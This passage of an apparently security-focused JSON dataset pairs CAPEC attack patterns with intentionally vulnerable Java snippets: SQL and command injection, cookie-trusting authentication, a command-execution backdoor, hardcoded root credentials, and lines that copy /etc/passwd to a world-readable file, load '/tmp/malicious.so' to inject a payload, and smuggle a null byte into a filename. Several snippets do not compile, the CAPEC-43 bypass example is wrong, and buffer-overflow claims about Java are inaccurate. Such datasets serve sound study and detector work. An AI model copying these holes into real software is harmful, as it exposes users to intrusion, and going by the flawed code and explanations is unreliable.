        "code_snippet": "public class FileProcessor {\n    private static String readAndProcessFile(String filename) {\n        File file = new File(filename);\n        if (file.exists()) {  // Check\n            // Some time passes, potential race condition window\n            try {\n                Thread.sleep(100);  // Simulate some processing time\n                \n                // Use - file could have been modified/replaced since check\n                FileInputStream fis = new FileInputStream(file);\n                BufferedReader reader = new BufferedReader(new InputStreamReader(fis));\n                String content = reader.readLine();\n                reader.close();\n                return content;\n            } catch (Exception e) {\n                return null;\n            }\n        }\n        return null;\n    }\n\n    public static void main(String[] args) {\n        Thread thread1 = new Thread(() -> readAndProcessFile(\"sensitive.txt\"));\n        Thread thread2 = new Thread(() -> readAndProcessFile(\"sensitive.txt\"));\n        \n        thread1.start();\n        thread2.start();\n    }\n}",
        "description": "This code demonstrates a classic Time-of-Check Time-of-Use (TOCTOU) race condition vulnerability. The code checks if a file exists and then attempts to read it later, but between these operations, the file could be modified, replaced, or deleted by another process or thread. The artificial sleep makes the race condition window more obvious. Multiple threads accessing the same file simultaneously without proper synchronization further compounds the race condition issue."
    },
    {
        "capec_id": "30",
        "capec_name": "Hijacking a Privileged Thread of Execution",
        "code_snippet": "public class ThreadHijacker {\n    public static void main(String[] args) {\n        try {\n            // Get all running processes\n            Runtime runtime = Runtime.getRuntime();\n            String cmd = System.getProperty(\"user.input\") + \" -listThreads\";\n            Process proc = runtime.exec(cmd);\n            \n            // Find target process ID and thread ID (simplified)\n            int targetPID = 1234;\n            int targetTID = 5678;\n            \n            // Load malicious native library\n            System.load(\"/tmp/malicious.so\");\n            \n            // Native method to manipulate thread\n            native void injectCode(int pid, int tid, byte[] payload);\n            \n            // Prepare malicious payload\n            byte[] payload = new byte[] { /* malicious code */ };\n            \n            // Inject into privileged thread\n            injectCode(targetPID, targetTID, payload);\n            \n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This vulnerable code demonstrates thread hijacking by attempting to inject malicious code into a running process. It contains multiple vulnerabilities: OS command injection through unvalidated user input, unsafe loading of native libraries, improper privilege management during thread manipulation, and potential race conditions during thread access. The code attempts to locate a target process and thread, then uses native methods to inject and execute malicious code in the context of a privileged thread."
    },
    {
        "capec_id": "31",
        "capec_name": "Accessing/Intercepting/Modifying HTTP Cookies",
        "code_snippet": "public class VulnerableCookieManager {\n    public void handleUserSession(HttpServletRequest request, HttpServletResponse response) {\n        String authToken = request.getParameter(\"authToken\");\n        String userData = request.getParameter(\"userData\");\n        \n        // Store sensitive data in cookie without encryption\n        Cookie userCookie = new Cookie(\"userAuth\", authToken + \":\" + userData);\n        userCookie.setMaxAge(365 * 24 * 60 * 60); // Persistent cookie for 1 year\n        userCookie.setSecure(false);\n        userCookie.setHttpOnly(false);\n        response.addCookie(userCookie);\n        \n        // Validate user session based on cookie without proper checks\n        Cookie[] cookies = request.getCookies();\n        for(Cookie cookie : cookies) {\n            if(cookie.getName().equals(\"userAuth\")) {\n                // Directly trust cookie value without validation\n                String[] parts = cookie.getValue().split(\":\");\n                authenticateUser(parts[0]);\n                setUserPrivileges(parts[1]);\n                break;\n            }\n        }\n    }\n    \n    private void authenticateUser(String token) {\n        // Directly use token without verification\n        UserSession.setAuthenticated(true);\n    }\n    \n    private void setUserPrivileges(String userData) {\n        // Directly set privileges from cookie data\n        UserSession.setPrivileges(userData);\n    }\n}",
        "description": "This code demonstrates multiple cookie-related vulnerabilities including storing sensitive data in cleartext cookies, using persistent cookies for authentication, lack of proper cookie validation, and trusting cookie data without verification. The code stores authentication tokens and user data in cookies without encryption, uses persistent cookies that don't expire with the session, and performs authentication based on unvalidated cookie values."
    },
    {
        "capec_id": "32",
        "capec_name": "XSS Through HTTP Query Strings",
        "code_snippet": "public class SearchServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        String searchQuery = request.getParameter(\"query\");\n        response.setContentType(\"text/html\");\n        PrintWriter out = response.getWriter();\n        out.println(\"<html><body>\");\n        out.println(\"<h2>Search Results for: \" + searchQuery + \"</h2>\"); // Vulnerable: Direct output without sanitization\n        out.println(\"<div id='results'>\");\n        performSearch(searchQuery, out);\n        out.println(\"</div></body></html>\");\n    }\n\n    private void performSearch(String query, PrintWriter out) {\n        // Simulated search results output\n        out.println(\"<p>Found results for: \" + query + \"</p>\"); // Vulnerable: XSS\n    }\n}",
        "description": "This vulnerable servlet accepts a search query parameter via GET request and outputs it directly into the HTML response without any sanitization or encoding. An attacker can inject malicious script tags or encoded URI schemes in the query parameter, which will be executed in the victim's browser when the response is rendered."
    },
    {
        "capec_id": "33",
        "capec_name": "HTTP Request Smuggling",
        "code_snippet": "public class VulnerableProxy extends HttpServlet {\n    @Override\n    protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        String contentLength = request.getHeader(\"Content-Length\");\n        String transferEncoding = request.getHeader(\"Transfer-Encoding\");\n        \n        // Vulnerable: Inconsistent handling of headers\n        if (transferEncoding != null && transferEncoding.equalsIgnoreCase(\"chunked\")) {\n            handleChunkedRequest(request);\n        } else {\n            handleFixedLengthRequest(request, contentLength);\n        }\n        \n        // Vulnerable: Direct forwarding of headers without sanitization\n        String forwardUrl = request.getHeader(\"X-Forward-To\");\n        if (forwardUrl != null) {\n            URL url = new URL(forwardUrl);\n            HttpURLConnection conn = (HttpURLConnection) url.openConnection();\n            \n            // Copy all headers without validation\n            Enumeration<String> headerNames = request.getHeaderNames();\n            while (headerNames.hasMoreElements()) {\n                String headerName = headerNames.nextElement();\n                String headerValue = request.getHeader(headerName);\n                conn.setRequestProperty(headerName, headerValue);\n            }\n            \n            // Forward the response without checking source\n            try (InputStream in = conn.getInputStream();\n                 OutputStream out = response.getOutputStream()) {\n                byte[] buffer = new byte[1024];\n                int len;\n                while ((len = in.read(buffer)) != -1) {\n                    out.write(buffer, 0, len);\n                }\n            }\n        }\n    }\n}",
        "description": "This code demonstrates a vulnerable HTTP proxy implementation that is susceptible to HTTP Request Smuggling, Request Splitting, and SSRF attacks. It incorrectly handles Content-Length and Transfer-Encoding headers, making it vulnerable to request smuggling. It also forwards headers and requests without proper validation or sanitization, enabling request splitting and SSRF attacks. The proxy acts as a confused deputy by not properly preserving or validating the source of requests."
    },
    {
        "capec_id": "34",
        "capec_name": "HTTP Response Splitting",
        "code_snippet": "public class VulnerableHttpProxy {\n    public void processResponse(HttpServletRequest request, HttpServletResponse response) {\n        String userInput = request.getParameter(\"data\");\n        \n        // Vulnerable header manipulation without proper sanitization\n        response.setHeader(\"Location\", userInput);\n        \n        // Vulnerable response splitting due to unfiltered CRLF\n        String contentType = \"text/html\" + userInput;\n        response.setHeader(\"Content-Type\", contentType);\n        \n        // Vulnerable response body construction\n        StringBuilder responseBody = new StringBuilder();\n        responseBody.append(\"HTTP/1.1 200 OK\\r\\n\");\n        responseBody.append(\"Content-Length: \" + userInput + \"\\r\\n\");\n        responseBody.append(\"\\r\\n\");\n        responseBody.append(userInput);\n        \n        response.getWriter().write(responseBody.toString());\n    }\n}",
        "description": "This code demonstrates a vulnerable HTTP proxy implementation that allows HTTP response splitting and smuggling. It accepts unsanitized user input and directly incorporates it into HTTP headers and response body without proper validation or encoding. The code allows injection of CRLF sequences and special characters that can lead to response splitting attacks, header manipulation, and inconsistent HTTP message interpretation between different components in the request/response chain."
    },
    {
        "capec_id": "35",
        "capec_name": "Leverage Executable Code in Non-Executable Files",
        "code_snippet": "public class ConfigLoader {\n    public static void loadConfig(String configPath) {\n        try {\n            Properties props = new Properties();\n            File configFile = new File(configPath);\n            FileInputStream fis = new FileInputStream(configFile);\n            props.load(fis);\n            \n            // Dynamically execute commands from config\n            String customCommand = props.getProperty(\"custom.command\");\n            if (customCommand != null) {\n                ScriptEngineManager manager = new ScriptEngineManager();\n                ScriptEngine engine = manager.getEngineByName(\"javascript\");\n                engine.eval(customCommand);\n            }\n            \n            // Load and execute custom class from config\n            String customClassPath = props.getProperty(\"custom.class.path\");\n            if (customClassPath != null) {\n                URLClassLoader classLoader = new URLClassLoader(\n                    new URL[]{new File(customClassPath).toURI().toURL()}\n                );\n                Class<?> customClass = classLoader.loadClass(\n                    props.getProperty(\"custom.class.name\")\n                );\n                customClass.getDeclaredMethod(\"execute\").invoke(null);\n            }\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This vulnerable code loads configuration from an external file and executes commands and loads classes specified in the configuration without proper validation. It demonstrates multiple vulnerabilities including Code Injection (CWE-94), Static Code Injection (CWE-96), and Eval Injection (CWE-95) by allowing arbitrary code execution through configuration parameters. The code also fails to implement proper access controls or privilege management (CWE-272, CWE-282)."
    },
    {
        "capec_id": "36",
        "capec_name": "Using Unpublished Interfaces or Functionality",
        "code_snippet": "public class AdminInterface {\n    private static boolean debugMode = true;\n    \n    // Hidden backdoor interface for system maintenance\n    public static void executeCommand(String command) {\n        if (debugMode) {\n            try {\n                Runtime.getRuntime().exec(command);\n            } catch (Exception e) {\n                e.printStackTrace();\n            }\n        }\n    }\n    \n    // Undocumented API endpoint\n    public static void directDatabaseAccess(String query) {\n        try {\n            Class.forName(\"com.mysql.jdbc.Driver\");\n            java.sql.Connection conn = java.sql.DriverManager.getConnection(\n                \"jdbc:mysql://localhost/system_db\", \"root\", \"password\");\n            conn.createStatement().executeUpdate(query);\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This vulnerable code implements hidden administrative interfaces without proper authentication or authorization checks. It includes a debug mode that's always enabled and allows direct command execution, plus an undocumented database access method. Both methods expose critical functionality without verifying user identity or permissions, allowing unauthorized access to system-level operations."
    },
    {
        "capec_id": "37",
        "capec_name": "Retrieve Embedded Sensitive Data",
        "code_snippet": "public class UserDataManager {\n    private static String[] userCredentials = new String[100];\n    private static int currentIndex = 0;\n\n    public static void storeCredential(String username, String password) {\n        String credential = username + \":\" + password;\n        userCredentials[currentIndex] = credential;\n        currentIndex++;\n    }\n\n    public static void deleteCredential(int index) {\n        // Vulnerable: Simply setting to null without properly clearing sensitive data\n        userCredentials[index] = null;\n    }\n\n    public static void writeToFile(String filename) {\n        try (FileWriter writer = new FileWriter(filename)) {\n            for (String credential : userCredentials) {\n                if (credential != null) {\n                    // Vulnerable: Writing sensitive data in cleartext\n                    writer.write(credential + \"\\n\");\n                }\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This code demonstrates multiple vulnerabilities related to improper handling of sensitive data. It stores user credentials in cleartext within an array, doesn't properly clear sensitive data when deleting (simply sets to null instead of zeroing out the memory), and writes sensitive information to a file in cleartext. The code fails to implement proper encryption for sensitive data storage and doesn't properly sanitize or remove sensitive data before resource reuse."
    },
    {
        "capec_id": "38",
        "capec_name": "Leveraging/Manipulating Configuration File Search Paths",
        "code_snippet": "public class LibraryLoader {\n    private String libPath = System.getProperty(\"java.library.path\");\n    \n    public void loadCustomLibrary(String libraryName) {\n        String pathFromConfig = getPathFromConfig();\n        System.setProperty(\"java.library.path\", pathFromConfig);\n        \n        try {\n            System.loadLibrary(libraryName);\n        } catch (UnsatisfiedLinkError e) {\n            System.out.println(\"Failed to load library: \" + libraryName);\n        }\n    }\n    \n    private String getPathFromConfig() {\n        Properties props = new Properties();\n        try {\n            FileInputStream in = new FileInputStream(\"config.properties\");\n            props.load(in);\n            return props.getProperty(\"library.path\");\n        } catch (IOException e) {\n            return \"/usr/lib\";\n        }\n    }\n}",
        "description": "This vulnerable code allows manipulation of the Java library path through an external configuration file. An attacker could modify the config.properties file to include a malicious path containing compromised libraries, which would then be loaded by the application. The code doesn't validate the path or the library being loaded, making it susceptible to both path manipulation and untrusted library loading attacks."
    },
    {
        "capec_id": "39",
        "capec_name": "Manipulating Opaque Client-based Data Tokens",
        "code_snippet": "public class UserSessionManager {\n    public boolean authenticateUser(HttpServletRequest request) {\n        Cookie[] cookies = request.getCookies();\n        String userId = null;\n        String role = null;\n\n        for (Cookie cookie : cookies) {\n            if (cookie.getName().equals(\"user_id\")) {\n                userId = cookie.getValue();\n            } else if (cookie.getName().equals(\"role\")) {\n                role = cookie.getValue();\n            }\n        }\n\n        // Vulnerable: directly trusting client-side data without validation\n        if (userId != null && role != null) {\n            // Store unvalidated session data\n            request.getSession().setAttribute(\"authenticated_user\", userId);\n            request.getSession().setAttribute(\"user_role\", role);\n            return true;\n        }\n\n        return false;\n    }\n\n    public boolean authorizeAccess(HttpServletRequest request, String resource) {\n        String userRole = (String) request.getSession().getAttribute(\"user_role\");\n        // Vulnerable: assuming client-side role data is trustworthy\n        if (userRole != null && userRole.equals(\"admin\")) {\n            return true;\n        }\n        return false;\n    }\n}",
        "description": "This vulnerable code demonstrates multiple security issues: it trusts client-side cookies for authentication without integrity checks, stores sensitive information in cookies without encryption, and makes authorization decisions based on unvalidated client-supplied data. The code fails to implement proper session management and parameter validation, making it susceptible to session fixation and parameter tampering attacks."
    },
    {
        "capec_id": "40",
        "capec_name": "Manipulating Writeable Terminal Devices",
        "code_snippet": "public class TerminalAccess {\n    public static void processInput(String userInput) {\n        try {\n            String command = \"echo \" + userInput + \" > /dev/pts/0\";\n            Process process = Runtime.getRuntime().exec(command);\n            \n            // Store sensitive data in a world-readable directory\n            String outputCommand = \"cp /etc/passwd /tmp/data.txt\";\n            Process outputProcess = Runtime.getRuntime().exec(outputCommand);\n            \n            // Grant permissive permissions\n            Runtime.getRuntime().exec(\"chmod 777 /tmp/data.txt\");\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n    \n    public static void main(String[] args) {\n        String input = System.getProperty(\"user.input\");\n        processInput(input);\n    }\n}",
        "description": "This code demonstrates a vulnerable terminal write operation where user input is directly written to a terminal device without sanitization. It also includes insecure handling of sensitive files by copying them to a world-readable directory with permissive permissions. The code is vulnerable to command injection and exposes sensitive information through visible command-line operations."
    },
    {
        "capec_id": "41",
        "capec_name": "Using Meta-characters in E-mail Headers to Inject Malicious Payloads",
        "code_snippet": "public class EmailHeaderProcessor {\n    public void processEmailHeaders(String rawHeaders) {\n        String[] headers = rawHeaders.split(\"\\n\");\n        StringBuilder processedEmail = new StringBuilder();\n        \n        for(String header : headers) {\n            // Directly append header without sanitization\n            if(header.startsWith(\"Subject:\")) {\n                processedEmail.append(header);\n            } else if(header.startsWith(\"Content-Type:\")) {\n                // Vulnerable: doesn't properly validate content type\n                processedEmail.append(header + \";charset=\\\"<script>alert(1)</script>\\\"\");\n            }\n            \n            // Vulnerable: allows meta-characters and control sequences\n            if(header.contains(\"X-Custom-Header:\")) {\n                String customValue = header.substring(header.indexOf(\":\") + 1);\n                executeCommand(\"mail -s \\\"\" + customValue + \"\\\" recipient@example.com\");\n            }\n        }\n        \n        renderEmail(processedEmail.toString());\n    }\n    \n    private void executeCommand(String cmd) {\n        try {\n            Runtime.getRuntime().exec(cmd);\n        } catch(Exception e) {}\n    }\n    \n    private void renderEmail(String content) {\n        // Render email content without proper escaping\n    }\n}",
        "description": "This code demonstrates vulnerable email header processing that fails to properly sanitize meta-characters and special sequences in email headers. It allows for potential script injection through headers, improper command execution through custom headers, and fails to properly escape output when rendering email content. The code exhibits multiple vulnerabilities including improper neutralization of meta-characters, argument injection, and improper output encoding."
    },
    {
        "capec_id": "42",
        "capec_name": "MIME Conversion",
        "code_snippet": "public void processMIMEMessage(String emailContent) {\n    byte[] buffer = new byte[1024];\n    String boundary = emailContent.substring(emailContent.indexOf(\"boundary=\"));\n    \n    // Parse MIME parts\n    String[] parts = emailContent.split(boundary);\n    for(String part : parts) {\n        if(part.contains(\"Content-Type\")) {\n            String contentType = part.substring(part.indexOf(\"Content-Type:\"));\n            // Decode base64 content without size validation\n            if(contentType.contains(\"base64\")) {\n                byte[] decodedData = Base64.getDecoder().decode(part);\n                // Vulnerable: No bounds checking when copying to buffer\n                System.arraycopy(decodedData, 0, buffer, 0, decodedData.length);\n                \n                // Process attachment based on file extension without validation\n                String fileName = part.substring(part.indexOf(\"filename=\"));\n                if(fileName.endsWith(\".doc\")) {\n                    processWordDocument(buffer);\n                }\n            }\n        }\n    }\n}",
        "description": "This vulnerable code processes MIME messages by parsing email content and handling base64 encoded attachments. It contains multiple vulnerabilities: a classic buffer overflow due to unchecked buffer copying, improper input validation for MIME content, unsafe handling of file extensions, and potential for MIME parsing injection attacks. The code blindly copies decoded base64 data into a fixed-size buffer without size verification and processes files based solely on their extension names."
    },
    {
        "capec_id": "43",
        "capec_name": "Exploiting Multiple Input Interpretation Layers",
        "code_snippet": "public class CommandExecutor {\n    public void executeCommand(String userInput) {\n        // First parser: URL decode\n        String decoded = URLDecoder.decode(userInput, StandardCharsets.UTF_8);\n        \n        // Input validation - only alphanumeric and spaces allowed\n        if (!decoded.matches(\"^[a-zA-Z0-9 ]*$\")) {\n            throw new IllegalArgumentException(\"Invalid input\");\n        }\n        \n        // Second parser: Remove escape sequences\n        String unescaped = StringEscapeUtils.unescapeJava(decoded);\n        \n        // Execute the command\n        ProcessBuilder pb = new ProcessBuilder(\"/bin/sh\", \"-c\", unescaped);\n        pb.start();\n    }\n}",
        "description": "This vulnerable code demonstrates incorrect behavior order in input validation. It first decodes URL-encoded input, then validates it for alphanumeric characters, and finally unescapes Java string sequences before executing a shell command. An attacker could bypass the validation by providing URL-encoded and escaped malicious commands that would only become dangerous after both parsing steps are complete. For example, the input '%25%36c%25%73' would decode to '%6c%73', pass the alphanumeric check, then unescape to 'ls', allowing command injection."
    },
    {
        "capec_id": "44",
        "capec_name": "Overflow Binary Resource File",
        "code_snippet": "public class ImageProcessor {\n    public void processImage(String fileName) {\n        byte[] buffer = new byte[1024];\n        try {\n            FileInputStream fis = new FileInputStream(fileName);\n            int bytesRead = 0;\n            \n            // No validation of file extension or type\n            if(fileName.endsWith(\".jpg\")) {\n                // Vulnerable buffer copy without size check\n                while((bytesRead = fis.read()) != -1) {\n                    // Direct copy to buffer without bounds checking\n                    buffer[bytesRead] = (byte)fis.read();\n                }\n                \n                // Process buffer content without validation\n                processImageData(buffer);\n            }\n            fis.close();\n        } catch(IOException e) {\n            e.printStackTrace();\n        }\n    }\n    \n    private void processImageData(byte[] data) {\n        // Process image data without bounds checking\n        for(int i = 0; i <= data.length; i++) {\n            // Potential buffer overflow\n            data[i] = (byte)(data[i] * 2);\n        }\n    }\n}",
        "description": "This code demonstrates a vulnerable image processing implementation that contains multiple security flaws: it performs unsafe buffer operations without proper bounds checking, relies solely on file extension for validation, and implements improper buffer copying. The code is susceptible to buffer overflow attacks through maliciously crafted binary files."
    },
    {
        "capec_id": "45",
        "capec_name": "Buffer Overflow via Symbolic Links",
        "code_snippet": "public class SymlinkProcessor {\n    private static final int BUFFER_SIZE = 1024;\n    \n    public void processSymlink(String symlinkPath) {\n        try {\n            byte[] buffer = new byte[BUFFER_SIZE];\n            File symlink = new File(symlinkPath);\n            String targetPath = symlink.getCanonicalPath();\n            \n            FileInputStream fis = new FileInputStream(targetPath);\n            int bytesRead = 0;\n            \n            // Vulnerable: No bounds checking on buffer size\n            while((bytesRead = fis.read(buffer)) > 0) {\n                // Process buffer without size validation\n                processBuffer(buffer, bytesRead);\n            }\n            fis.close();\n        } catch(IOException e) {\n            e.printStackTrace();\n        }\n    }\n    \n    private void processBuffer(byte[] buffer, int size) {\n        // Vulnerable: No validation of size parameter\n        byte[] processedData = new byte[size * 2];\n        System.arraycopy(buffer, 0, processedData, 0, size + 10); // Potential overflow\n    }\n}",
        "description": "This vulnerable code processes symbolic links without proper validation, potentially leading to buffer overflows. It lacks proper bounds checking when copying data from the input buffer, doesn't validate the symlink target, and performs unsafe buffer operations that could lead to memory corruption. The code demonstrates multiple vulnerabilities including CWE-120 (buffer overflow), CWE-119 (improper buffer bounds), and CWE-20 (improper input validation)."
    },
    {
        "capec_id": "46",
        "capec_name": "Overflow Variables and Tags",
        "code_snippet": "public class ConfigParser {\n    private static final int BUFFER_SIZE = 256;\n    \n    public static String parseConfigValue(String input) {\n        byte[] buffer = new byte[BUFFER_SIZE];\n        \n        try {\n            // Unsafe copy of input into fixed buffer without size check\n            input.getBytes(\"UTF-8\").copyInto(buffer);\n            \n            // Process configuration tags\n            String config = new String(buffer);\n            if (config.contains(\"<tag>\")) {\n                // Unsafe string manipulation without proper bounds checking\n                int tagStart = config.indexOf(\"<tag>\");\n                int tagEnd = config.indexOf(\"</tag>\");\n                return config.substring(tagStart, tagEnd + 6);\n            }\n        } catch (Exception e) {\n            // Silently ignore overflow errors\n        }\n        return null;\n    }\n}",
        "description": "This vulnerable code demonstrates a buffer overflow through unsafe configuration parsing. It uses a fixed-size buffer without checking input length, performs unsafe string operations, and processes HTML-like configuration tags without proper validation. The code is susceptible to buffer overflow when input exceeds BUFFER_SIZE, and lacks proper input validation for tag processing."
    },
    {
        "capec_id": "47",
        "capec_name": "Buffer Overflow via Parameter Expansion",
        "code_snippet": "public class DataExpander {\n    private static final int BUFFER_SIZE = 1024;\n\n    public byte[] expandData(byte[] input) {\n        byte[] output = new byte[BUFFER_SIZE];\n        int expansionFactor = 2;\n        \n        // Expand each byte into multiple bytes\n        for(int i = 0; i < input.length; i++) {\n            for(int j = 0; j < expansionFactor; j++) {\n                output[i * expansionFactor + j] = input[i];\n            }\n        }\n        \n        return output;\n    }\n\n    public void processUserData(String userData) {\n        byte[] inputBuffer = userData.getBytes();\n        byte[] expandedData = expandData(inputBuffer);\n        // Continue processing expandedData...\n    }\n}",
        "description": "This vulnerable code demonstrates an expansion attack where input data is expanded during processing without proper size validation. The code allocates a fixed-size output buffer but doesn't verify if the expanded data will fit within it. When the input length multiplied by the expansion factor exceeds BUFFER_SIZE, it causes a buffer overflow. The code also lacks input validation and proper bounds checking, making it susceptible to memory corruption."
    },
    {
        "capec_id": "48",
        "capec_name": "Passing Local Filenames to Functions That Expect a URL",
        "code_snippet": "public class FileAccessServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        String userFile = request.getParameter(\"file\");\n        String userType = request.getParameter(\"type\");\n        \n        File file = new File(userFile);\n        if(userType.equals(\"document\")) {\n            FileInputStream fis = new FileInputStream(file);\n            byte[] data = new byte[(int) file.length()];\n            fis.read(data);\n            \n            response.setContentType(\"application/octet-stream\");\n            response.getOutputStream().write(data);\n            fis.close();\n        }\n    }\n}",
        "description": "This vulnerable code accepts a file path and type parameter directly from a GET request without proper validation. It allows direct access to local files through client-side requests, doesn't validate file types or paths, and exposes sensitive file content through GET parameters. The code fails to properly sanitize input or restrict file access, allowing path traversal and potential exposure of sensitive local files."
    },
    {
        "capec_id": "49",
        "capec_name": "Password Brute Forcing",
        "code_snippet": "public class SimpleAuthenticator {\n    private static final int MAX_PASSWORD_AGE_DAYS = 365;\n    private String storedPassword = \"5f4dcc3b5aa765d61d8327deb882cf99\"; // MD5 hash of 'password'\n\n    public boolean login(String username, String password) {\n        String hashedPassword = getMD5Hash(password);\n        return storedPassword.equals(hashedPassword);\n    }\n\n    private String getMD5Hash(String input) {\n        try {\n            MessageDigest md = MessageDigest.getInstance(\"MD5\");\n            byte[] messageDigest = md.digest(input.getBytes());\n            StringBuilder hexString = new StringBuilder();\n            for (byte b : messageDigest) {\n                hexString.append(String.format(\"%02x\", b));\n            }\n            return hexString.toString();\n        } catch (NoSuchAlgorithmException e) {\n            return \"\";\n        }\n    }\n\n    public boolean validatePassword(String password) {\n        return password.length() >= 4; // Weak password requirement\n    }\n}",
        "description": "This code demonstrates multiple security vulnerabilities including weak password validation (min length 4), using MD5 for password hashing (cryptographically broken), no protection against brute force attempts, single-factor authentication, and storing passwords in a recoverable format. The password expiration is set to 365 days which is too long."
    },
    {
        "capec_id": "50",
        "capec_name": "Password Recovery Exploitation",
        "code_snippet": "public class PasswordRecovery {\n    private static final String SECRET_ANSWER = \"smith\";  // hardcoded security answer\n    private static final String STORED_PASSWORD = \"mypass123\";  // password stored in plaintext\n\n    public String recoverPassword(String username, String securityAnswer) {\n        // weak security check - case insensitive comparison\n        if (securityAnswer.toLowerCase().equals(SECRET_ANSWER)) {\n            // directly return the stored password\n            return STORED_PASSWORD;\n        }\n        return null;\n    }\n\n    public boolean resetPassword(String username, String newPassword) {\n        // no password strength requirements\n        // accepts any password without validation\n        storePassword(username, newPassword);\n        return true;\n    }\n\n    private void storePassword(String username, String password) {\n        // stores password in plaintext\n        // implementation omitted\n    }\n}",
        "description": "This code demonstrates multiple password recovery vulnerabilities: storing passwords in plaintext, weak security question mechanism, lack of password strength validation, and direct password recovery instead of reset. The security answer is hardcoded and case-insensitive, making it easy to guess. Passwords are stored and transmitted in a recoverable format, violating security best practices."
    },
    {
        "capec_id": "51",
        "capec_name": "Poison Web Service Registry",
        "code_snippet": "public class WebServiceRegistry {\n    private static Map<String, String> serviceRegistry = new HashMap<>();\n\n    public static void registerService(String serviceName, String endpoint) {\n        // No validation or authentication of who can register services\n        serviceRegistry.put(serviceName, endpoint);\n    }\n\n    public static String lookupService(String serviceName) {\n        // Directly returns potentially malicious endpoint without verification\n        return serviceRegistry.get(serviceName);\n    }\n\n    public static void updateWSDLMetadata(String serviceName, String wsdlContent) {\n        // Stores sensitive WSDL information without encryption\n        try {\n            String registryKey = \"SOFTWARE\\\\WebServices\\\\\" + serviceName;\n            WinRegistry.writeStringValue(\n                WinRegistry.HKEY_LOCAL_MACHINE,\n                registryKey,\n                \"WSDLContent\",\n                wsdlContent  // Stores WSDL in cleartext\n            );\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n\n    public static String getServiceSchema(String serviceName) {\n        // No input validation, vulnerable to injection\n        String query = \"SELECT schema FROM service_schemas WHERE name='\" + serviceName + \"'\";\n        // Execute raw SQL query without preparation or sanitization\n        return executeQuery(query);\n    }\n}",
        "description": "This vulnerable code demonstrates a web service registry implementation that has multiple security issues: lack of authorization checks for service registration, no validation of service endpoints, cleartext storage of sensitive WSDL information in the registry, SQL injection vulnerability in schema retrieval, and no protection against registry poisoning attacks. The code allows any actor to register or modify service information, potentially redirecting service requests to malicious endpoints."
    },
    {
        "capec_id": "52",
        "capec_name": "Embedding NULL Bytes",
        "code_snippet": "public class FileProcessor {\n    public boolean validateAndProcessFileName(String userInput) {\n        // Attempt to process file with user input\n        try {\n            String filePath = \"/data/\" + userInput;\n            byte[] fileNameBytes = filePath.getBytes(\"UTF-8\");\n            \n            // Vulnerable comparison that doesn't properly handle null bytes\n            for(int i = 0; i < fileNameBytes.length; i++) {\n                if(fileNameBytes[i] == 0x00) {\n                    // Continue processing even after null byte\n                    continue;\n                }\n            }\n            \n            // Process file without proper validation\n            java.io.FileInputStream fis = new java.io.FileInputStream(filePath);\n            return true;\n            \n        } catch(Exception e) {\n            return false;\n        }\n    }\n}",
        "description": "This vulnerable code attempts to process a file name provided by user input without properly validating or handling null bytes. An attacker could inject a null byte into the file name to bypass security checks, potentially accessing files outside the intended directory. The code incorrectly handles null byte validation and continues processing even when encountering null bytes, leading to potential directory traversal or file access vulnerabilities."
    },
    {
        "capec_id": "53",
        "capec_name": "Postfix, Null Terminate, and Backslash",
        "code_snippet": "public class FileNameValidator {\n    public static boolean isValidFileName(String fileName) {\n        // Checks if filename ends with .txt and contains no path traversal\n        if (fileName == null || !fileName.endsWith(\".txt\")) {\n            return false;\n        }\n        \n        // Vulnerable validation - doesn't properly handle null bytes\n        byte[] fileNameBytes = fileName.getBytes();\n        String sanitizedName = new String(fileNameBytes);\n        \n        // Attacker can inject: \"malicious.php\\0.txt\"\n        // This passes the .txt check but may be processed as malicious.php\n        return !sanitizedName.contains(\"../\");\n    }\n    \n    public static void main(String[] args) {\n        String maliciousInput = \"malicious.php\\0.txt\";\n        if (isValidFileName(maliciousInput)) {\n            // Process file - vulnerable to null byte injection\n            processFile(maliciousInput);\n        }\n    }\n    \n    private static void processFile(String fileName) {\n        // File processing logic\n    }\n}",
        "description": "This vulnerable code demonstrates how null byte injection can bypass input validation filters. The validator checks for .txt extension but fails to properly handle null bytes, allowing an attacker to inject malicious file types while still passing the validation. The code embodies CWE-158 by improperly handling null bytes and CWE-20 through inadequate input validation."
    },
    {
        "capec_id": "54",
        "capec_name": "Query System for Information",
        "code_snippet": "public class UserService {\n    private Connection conn;\n\n    public UserProfile getUserData(HttpServletRequest request) {\n        String userId = request.getParameter(\"id\");\n        String query = \"SELECT * FROM users WHERE user_id = \" + userId;\n        \n        try {\n            Statement stmt = conn.createStatement();\n            ResultSet rs = stmt.executeQuery(query);\n            \n            if(rs.next()) {\n                UserProfile profile = new UserProfile();\n                profile.setUsername(rs.getString(\"username\"));\n                profile.setSsn(rs.getString(\"ssn\"));\n                profile.setCreditCard(rs.getString(\"credit_card\"));\n                return profile;\n            } else {\n                throw new Exception(\"User not found: \" + userId + \n                    \". Database connection details: \" + conn.getMetaData().getURL());\n            }\n        } catch(Exception e) {\n            response.sendError(500, e.getMessage());\n            return null;\n        }\n    }\n}",
        "description": "This vulnerable code demonstrates multiple security issues: SQL injection through unvalidated user input, exposure of sensitive data in error messages, use of GET parameters for sensitive data, and improper error handling that reveals system information. The code directly concatenates user input into SQL queries and returns sensitive data like SSN and credit card numbers in error messages."
    },
    {
        "capec_id": "55",
        "capec_name": "Rainbow Table Password Cracking",
